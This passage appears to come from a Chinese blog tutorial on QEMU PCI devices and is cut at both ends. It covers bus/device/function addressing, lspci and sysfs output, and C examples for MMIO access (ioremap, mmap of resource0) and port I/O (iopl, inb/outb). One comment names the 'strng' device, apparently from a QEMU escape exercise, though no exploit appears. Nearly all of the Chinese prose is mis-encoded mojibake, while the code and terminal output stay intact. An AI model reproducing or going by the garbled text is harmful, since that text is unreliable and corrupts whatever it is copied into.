å°„åˆ°ä¸ä¹‹ç›¸å…³è”çš„åœ°å€ã€‚å½“CPUè®¿é—®æŸä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå®ƒå¯èƒ½æ˜¯ç‰©ç†å†…å­˜ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªI&#x2F;Oè®¾å¤‡çš„å†…å­˜ï¼Œç”¨äºè®¿é—®å†…å­˜çš„CPUæŒ‡ä»¤ä¹Ÿå¯æ¥è®¿é—®I&#x2F;Oè®¾å¤‡ã€‚<strong>æ¯ä¸ªI&#x2F;Oè®¾å¤‡ç›‘è§†CPUçš„åœ°å€æ€»çº¿</strong>ï¼Œä¸€æ—¦CPUè®¿é—®åˆ†é…ç»™å®ƒçš„åœ°å€ï¼Œå®ƒå°±åšå‡ºå“åº”ï¼Œå°†æ•°æ®æ€»çº¿è¿æ¥åˆ°éœ€è¦è®¿é—®çš„è®¾å¤‡ç¡¬ä»¶å¯„å­˜å™¨ã€‚ä¸ºäº†å®¹çº³I&#x2F;Oè®¾å¤‡ï¼ŒCPUå¿…é¡»é¢„ç•™ç»™I&#x2F;Oä¸€ä¸ªåœ°å€åŒºåŸŸï¼Œè¯¥åœ°å€åŒºåŸŸä¸èƒ½ç»™ç‰©ç†å†…å­˜ä½¿ç”¨ã€‚</p><p>åœ¨<strong>PMIO</strong>ä¸­ï¼Œå†…å­˜å’ŒI&#x2F;Oè®¾å¤‡æœ‰å„è‡ªçš„åœ°å€ç©ºé—´ã€‚ ç«¯å£æ˜ å°„I&#x2F;Oé€šå¸¸ä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„CPUæŒ‡ä»¤ï¼Œä¸“é—¨æ‰§è¡ŒI&#x2F;Oæ“ä½œã€‚åœ¨Intelçš„å¾®å¤„ç†å™¨ä¸­ï¼Œä½¿ç”¨çš„æŒ‡ä»¤æ˜¯INå’ŒOUTã€‚è¿™äº›æŒ‡ä»¤å¯ä»¥è¯»&#x2F;å†™1,2,4ä¸ªå­—èŠ‚ï¼ˆä¾‹å¦‚ï¼š<code>outb</code>, <code>outw</code>, <code>outl</code>ï¼‰åˆ°IOè®¾å¤‡ä¸Šã€‚<strong>I&#x2F;Oè®¾å¤‡æœ‰ä¸€ä¸ªä¸å†…å­˜ä¸åŒçš„åœ°å€ç©ºé—´</strong>ï¼Œä¸ºäº†å®ç°åœ°å€ç©ºé—´çš„éš”ç¦»ï¼Œè¦ä¹ˆåœ¨CPUç‰©ç†æ¥å£ä¸Š<strong>å¢åŠ ä¸€ä¸ªI&#x2F;Oå¼•è„š</strong>ï¼Œè¦ä¹ˆ<strong>å¢åŠ ä¸€æ¡ä¸“ç”¨çš„I&#x2F;Oæ€»çº¿</strong>ã€‚ç”±äºI&#x2F;Oåœ°å€ç©ºé—´ä¸å†…å­˜åœ°å€ç©ºé—´æ˜¯éš”ç¦»çš„ï¼Œæ‰€ä»¥æœ‰æ—¶å°†<strong>PMIOç§°ä¸ºè¢«éš”ç¦»çš„IO</strong>(Isolated I&#x2F;O)ã€‚</p><h2 id="pciè®¾å¤‡inQemu"><a href="#pciè®¾å¤‡inQemu" class="headerlink" title="pciè®¾å¤‡inQemu"></a>pciè®¾å¤‡inQemu</h2><p><strong>pciè®¾å¤‡çš„å¯»å€æ˜¯ç”±æ€»çº¿ã€è®¾å¤‡ä»¥åŠåŠŸèƒ½æ„æˆã€‚</strong>å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>çš„æ ¼å¼ä¸º<code>æ€»çº¿:è®¾å¤‡:åŠŸèƒ½</code>çš„æ ¼å¼ã€‚</p><p>å…¶ä¸­<code>[0000]</code>è¡¨ç¤ºpciçš„åŸŸï¼Œ PCIåŸŸæœ€å¤šå¯ä»¥<strong>æ‰¿è½½256æ¡æ€»çº¿</strong>ã€‚ æ¯æ¡æ€»çº¿æœ€å¤šå¯ä»¥æœ‰<strong>32ä¸ªè®¾å¤‡</strong>ï¼Œæ¯ä¸ªè®¾å¤‡æœ€å¤šå¯ä»¥<strong>æœ‰8ä¸ªåŠŸèƒ½</strong>ã€‚</p><p>æ€»ä¹‹æ¯ä¸ª PCI è®¾å¤‡æœ‰<strong>ä¸€ä¸ªæ€»çº¿å·, ä¸€ä¸ªè®¾å¤‡å·, ä¸€ä¸ªåŠŸèƒ½å·æ ‡è¯†ã€‚</strong>PCI è§„èŒƒå…è®¸å•ä¸ªç³»ç»Ÿå ç”¨å¤šè¾¾ 256 ä¸ªæ€»çº¿, ä½†æ˜¯å› ä¸º 256 ä¸ªæ€»çº¿å¯¹è®¸å¤šå¤§ç³»ç»Ÿæ˜¯ä¸å¤Ÿçš„, Linux ç°åœ¨æ”¯æŒ PCI åŸŸã€‚<strong>æ¯ä¸ª PCI åŸŸå¯ä»¥å ç”¨å¤šè¾¾ 256 ä¸ªæ€»çº¿. æ¯ä¸ªæ€»çº¿å ç”¨ 32 ä¸ªè®¾å¤‡</strong>, æ¯ä¸ªè®¾å¤‡å¯ä»¥æ˜¯ ä¸€ä¸ªå¤šåŠŸèƒ½å¡(ä¾‹å¦‚ä¸€ä¸ªå£°éŸ³è®¾å¤‡, å¸¦æœ‰ä¸€ä¸ªé™„åŠ çš„ CD-ROM é©±åŠ¨)<strong>æœ‰æœ€å¤š 8 ä¸ªåŠŸèƒ½</strong>ã€‚</p><p>PCI è®¾å¤‡é€šè¿‡<code>VendorIDs</code>ã€<code>DeviceIDs</code>ã€ä»¥åŠ<code>Class Codes</code>å­—æ®µåŒºåˆ†ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  <span class="number">00f</span>f</span><br><span class="line">Vendor: <span class="number">1234</span></span><br><span class="line">Device: <span class="number">11e9</span></span><br><span class="line">SVendor:        <span class="number">1</span>af4</span><br><span class="line">SDevice:        <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  Unclassified device [<span class="number">00f</span>f]</span><br><span class="line">Vendor: Vendor <span class="number">1234</span></span><br><span class="line">Device: Device <span class="number">11e9</span></span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯é€šè¿‡æŸ¥çœ‹å…¶<code>config</code>æ–‡ä»¶æ¥æŸ¥çœ‹è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼Œæ•°æ®éƒ½å¯ä»¥åŒ¹é…ä¸Šï¼Œå¦‚å‰ä¸¤ä¸ªå­—èŠ‚<code>1234</code>ä¸º<code>vendor id</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è®¾å¤‡å†…å­˜ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¯¥è®¾å¤‡æœ‰ä¸¤ä¸ªç©ºé—´ï¼š<code>BAR0</code>ä¸º<code>MMIO</code>ç©ºé—´ï¼Œåœ°å€ä¸º<code>febf1000</code>ï¼Œå¤§å°ä¸º<code>256</code>ï¼›<code>BAR1</code>ä¸º<code>PMIO</code>ç©ºé—´ï¼Œç«¯å£åœ°å€ä¸º<code>0xc050</code>ï¼Œå¤§å°ä¸º<code>8</code>ã€‚</p><p>å¯ä»¥é€šè¿‡æŸ¥çœ‹<code>resource</code>æ–‡ä»¶æ¥æŸ¥çœ‹å…¶ç›¸åº”çš„å†…å­˜ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>resource</code>æ–‡ä»¶åŒ…å«å…¶å®ƒç›¸åº”ç©ºé—´çš„æ•°æ®ï¼Œå¦‚<code>resource0</code>ï¼ˆ<code>MMIO</code>ç©ºé—´ï¼‰ä»¥åŠ<code>resource1</code>ï¼ˆ<code>PMIO</code>ç©ºé—´ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>æ¯è¡Œåˆ†åˆ«è¡¨ç¤ºç›¸åº”ç©ºé—´çš„èµ·å§‹åœ°å€ï¼ˆ<code>start-address</code>ï¼‰ã€ç»“æŸåœ°å€ï¼ˆ<code>end-address</code>ï¼‰ä»¥åŠæ ‡è¯†ä½ï¼ˆ<code>flags</code>ï¼‰ã€‚</p><h2 id="qemuä¸­è®¿é—®I-Oç©ºé—´"><a href="#qemuä¸­è®¿é—®I-Oç©ºé—´" class="headerlink" title="qemuä¸­è®¿é—®I&#x2F;Oç©ºé—´"></a>qemuä¸­è®¿é—®I&#x2F;Oç©ºé—´</h2><p>å­˜åœ¨<code>mmio</code>ä¸<code>pmio</code>ï¼Œé‚£ä¹ˆåœ¨ç³»ç»Ÿä¸­è¯¥å¦‚ä½•è®¿é—®è¿™ä¸¤ä¸ªç©ºé—´å‘¢ï¼Ÿè®¿é—®<code>mmio</code>ä¸<code>pmio</code>éƒ½å¯ä»¥é‡‡ç”¨<strong>åœ¨å†…æ ¸æ€è®¿é—®</strong>æˆ–<strong>åœ¨ç”¨æˆ·ç©ºé—´ç¼–ç¨‹è¿›è¡Œè®¿é—®</strong>ã€‚</p><h3 id="è®¿é—®mmio"><a href="#è®¿é—®mmio" class="headerlink" title="è®¿é—®mmio"></a>è®¿é—®mmio</h3><p>ç¼–è¯‘<strong>å†…æ ¸</strong>æ¨¡å—ï¼Œåœ¨å†…æ ¸æ€è®¿é—®mmioç©ºé—´ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span>      <span class="comment">// æä¾› I/O å†…å­˜è®¿é—®å‡½æ•°ï¼ˆå¦‚ readb/writebï¼‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span> <span class="comment">// æä¾›èµ„æºç®¡ç†ç›¸å…³å‡½æ•°ï¼ˆå¦‚ request_mem_regionï¼‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize); <span class="comment">//å°†ç‰©ç†åœ°å€ ioaddr æ˜ å°„åˆ°å†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè¿”å›è™šæ‹Ÿåœ°å€ addrã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readb</span>(addr);  <span class="comment">// è¯»å– 1 å­—èŠ‚ï¼ˆ8 ä½ï¼‰</span></span><br><span class="line"><span class="built_in">readw</span>(addr);  <span class="comment">// è¯»å– 2 å­—èŠ‚ï¼ˆ16 ä½ï¼‰</span></span><br><span class="line"><span class="built_in">readl</span>(addr);  <span class="comment">// è¯»å– 4 å­—èŠ‚ï¼ˆ32 ä½ï¼‰</span></span><br><span class="line"><span class="built_in">readq</span>(addr);  <span class="comment">// è¯»å– 8 å­—èŠ‚ï¼ˆ64 ä½ï¼Œä»…åœ¨ 64 ä½ç³»ç»Ÿæ”¯æŒï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">writeb</span>(val, addr);  <span class="comment">// å†™å…¥ 1 å­—èŠ‚</span></span><br><span class="line"><span class="built_in">writew</span>(val, addr);  <span class="comment">// å†™å…¥ 2 å­—èŠ‚</span></span><br><span class="line"><span class="built_in">writel</span>(val, addr);  <span class="comment">// å†™å…¥ 4 å­—èŠ‚</span></span><br><span class="line"><span class="built_in">writeq</span>(val, addr);  <span class="comment">// å†™å…¥ 8 å­—èŠ‚</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __iomem *addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ç”³è¯·èµ„æº</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">request_mem_region</span>(ioaddr, iomemsize, <span class="string">&quot;my_device&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;  <span class="comment">// èµ„æºå·²è¢«å ç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. æ˜ å°„ç‰©ç†åœ°å€</span></span><br><span class="line">addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize);</span><br><span class="line"><span class="keyword">if</span> (!addr) &#123;</span><br><span class="line">    <span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. è¯»å†™æ“ä½œ</span></span><br><span class="line">val = <span class="built_in">readl</span>(addr);          <span class="comment">// è¯»å– 32 ä½</span></span><br><span class="line"><span class="built_in">writel</span>(val + <span class="number">1</span>, addr);      <span class="comment">// å†™å…¥ 32 ä½</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. æ¸…ç†</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br><span class="line"><span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯åœ¨ç”¨æˆ·æ€è®¿é—®mmioç©ºé—´ï¼Œé€šè¿‡æ˜ å°„<code>resource0</code>æ–‡ä»¶å®ç°å†…å­˜çš„è®¿é—®ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è®¿é—®pmio"><a href="#è®¿é—®pmio" class="headerlink" title="è®¿é—®pmio"></a>è®¿é—®pmio</h3><p>ç¼–è¯‘å†…æ ¸æ¨¡å—ï¼Œåœ¨å†…æ ¸ç©ºé—´è®¿é—®pmioç©ºé—´ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//è¯»å–ä¸€å­—èŠ‚</span></span><br><span class="line">inw(port);  <span class="comment">//è¯»å–ä¸¤å­—èŠ‚</span></span><br><span class="line">inl(port);  <span class="comment">//è¯»å–å››å­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//å†™ä¸€å­—èŠ‚</span></span><br><span class="line">outw(val,port); <span class="comment">//å†™ä¸¤å­—èŠ‚</span></span><br><span class="line">outl(val,port); <span class="comment">//å†™å››å­—èŠ‚</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·ç©ºé—´è®¿é—®åˆ™éœ€è¦å…ˆè°ƒç”¨<code>iopl</code>å‡½æ•°ç”³è¯·è®¿é—®ç«¯å£ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯åœ¨è®¿é—®pmioçš„æ—¶å€™ï¼Œæ˜¯ç›´æ¥é€šè¿‡I&#x2F;O portå†™å…¥å’Œè¯»å–èµ„æºçš„ï¼Œå› æ­¤è¦äº‹å…ˆå£°æ˜portå½’å±ï¼Œä¸ç„¶æœ‰å¯èƒ½ä¼šå¯¼è‡´å†²çªï¼Œpmioå¸¸è§ç”¨äºx86å¹³å°ä¸Šï¼Œé€‚ç”¨äºä¼ ç»Ÿçš„è®¾å¤‡ï¼Œå¦‚ï¼šä¸²å£ï¼Œé”®ç›˜ç­‰ç­‰</p><table><thead><tr><th align="left"><strong>ç‰¹æ€§</strong></th><th align="left"><strong>MMIOï¼ˆioremap + readl&#x2F;writelï¼‰</strong></th><th align="left"><strong>PMIOï¼ˆinb&#x2F;outbï¼‰</strong></th></tr></thead><tbody><tr><td align="left"><strong>è®¿é—®æ–¹å¼</strong></td><td align="left">å†…å­˜æ˜ å°„ï¼ˆç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼‰</td><td align="left">I&#x2F;O ç«¯å£ï¼ˆx86 <code>in</code>&#x2F;<code>out</code> æŒ‡ä»¤ï¼‰</td></tr><tr><td align="left"><strong>é€‚ç”¨æ¶æ„</strong></td><td align="left">æ‰€æœ‰æ¶æ„ï¼ˆx86&#x2F;ARM&#x2F;RISC-Vï¼‰</td><td align="left">ä¸»è¦æ˜¯ x86</td></tr><tr><td align="left"><strong>åœ°å€èŒƒå›´</strong></td><td align="left">32&#x2F;64 ä½ç‰©ç†åœ°å€</td><td align="left">16 ä½ç«¯å£åœ°å€ï¼ˆ0x0000â€“0xFFFFï¼‰</td></tr><tr><td align="left"><strong>æ€§èƒ½</strong></td><td align="left">é€šå¸¸æ›´å¿«ï¼ˆå†…å­˜è®¿é—®ä¼˜åŒ–ï¼‰</td><td align="left">è¾ƒæ…¢ï¼ˆéœ€è¦ CPU I&#x2F;O æŒ‡ä»¤ï¼‰</td></tr><tr><td align="left"><strong>å…¸å‹è®¾å¤‡</strong></td><td align="left">PCIe è®¾å¤‡ã€GPUã€ç½‘å¡</td><td align="left">ä¼ ç»Ÿ ISA è®¾å¤‡ï¼ˆä¸²å£ã€PS&#x2F;2ï¼‰</td></tr></tbody></table><h2 id="QOMç¼–ç¨‹æ¨¡å‹"><a href="#QOMç¼–ç¨‹æ¨¡å‹" class="headerlink" title="QOMç¼–ç¨‹æ¨¡å‹"></a>QOMç¼–ç¨‹æ¨¡å‹</h2><p><code>QEMU</code>æä¾›äº†ä¸€å¥—é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ¨¡å‹â€”â€”<code>QOM</code>ï¼ˆ<code>QEMU Object Module</code>ï¼‰ï¼Œå‡ 